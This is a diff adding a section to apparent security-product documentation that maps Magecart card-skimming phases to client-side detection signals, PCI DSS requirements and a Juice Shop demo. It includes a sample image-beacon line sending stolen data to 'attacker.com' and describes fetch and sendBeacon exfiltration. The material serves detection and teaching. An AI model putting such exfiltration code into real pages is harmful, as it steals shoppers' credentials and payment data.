@@ -66,6 +66,63 @@ Both must be configured for CSD to work end-to-end:
 | Man-in-the-browser | Form field reads |
 | Cryptojacking | Script inventory + network interactions |
 
+## Magecart Kill Chain
+
+Magecart is the umbrella term for groups that inject JavaScript skimmers
+into e-commerce and login pages to steal credentials and payment data.
+Notable breaches include British Airways (380,000 cards), Ticketmaster
+(40,000 cards), and thousands of smaller e-commerce sites. The attack
+follows a predictable kill chain that maps directly to CSD's three
+detection signals.
+
+| Attacker Phase | What happens | CSD Detection Signal | Demo-able via evaluate_script? |
+| -------------- | ------------ | -------------------- | ----------------------------- |
+| **Recon** | Enumerate form fields on the page (`querySelectorAll('input')`) | Form field reads | Yes (pure DOM) |
+| **Harvest** | Read sensitive field values (email, password, card number) | Form field reads | Yes (pure DOM) |
+| **Supply chain** | Inject `<script>` tags from external CDNs or compromised third parties | Script inventory | No (needs initScript) |
+| **Exfiltrate** | Send stolen data to attacker-controlled server via fetch, XHR, or image beacon | Network interactions | No (needs initScript) |
+
+Note: Recon and Harvest both trigger the **same** CSD detection signal
+(form field reads). These are distinct attacker actions but a single
+detection vector. CSD sees "which scripts read which fields" — it does
+not distinguish between enumerating fields and reading their values.
+
+**PCI DSS mapping:** The supply chain phase (unauthorized script loading)
+maps to **requirement 6.4.3** (script inventory and authorization). The
+exfiltration phase (unexpected network calls) maps to **requirement
+11.6.1** (tamper detection and change alerting).
+
+### Exfiltration Techniques
+
+Magecart skimmers use several exfiltration methods:
+
+- **fetch / XHR** — POST stolen data to an attacker endpoint. CSD
+  detects the destination domain via the network interactions signal.
+- **Image beacon** — `new Image().src = 'https://attacker.com/c?d=...'`
+  encodes stolen data in the URL. This avoids CORS restrictions entirely
+  and is invisible to the user. CSD's telemetry captures network request
+  metadata from monitored scripts, which includes image beacon
+  destinations initiated within the page context.
+- **navigator.sendBeacon** — fires a one-way POST that survives page
+  navigation. Used when the skimmer wants to exfiltrate on form submit.
+
+CSD does **not** block fetch/XHR calls via mitigation — mitigation
+targets script loading (`<script>` tag `src` interception). Exfiltration
+domains are surfaced in the detected domains list for network-level
+blocking by the security team.
+
+### Live Demo: zone.js Compatibility
+
+When demonstrating the Magecart kill chain on Angular applications
+(Juice Shop), `evaluate_script` works for **pure DOM queries**
+(`querySelectorAll`, reading `.value`, `.id`, `.name`) but fails when
+calling any zone.js-patched API (`fetch`, `Image`, `setTimeout`,
+`XMLHttpRequest`). This means:
+
+- **Recon and Harvest** can be demoed live via `evaluate_script`
+- **Supply chain injection and Exfiltration** require `initScript`
+  with pre-saved native API references (see Phase 2 attack documentation)
+
 ## F5 XC Platform Operations
 
 ### Console UI Navigation
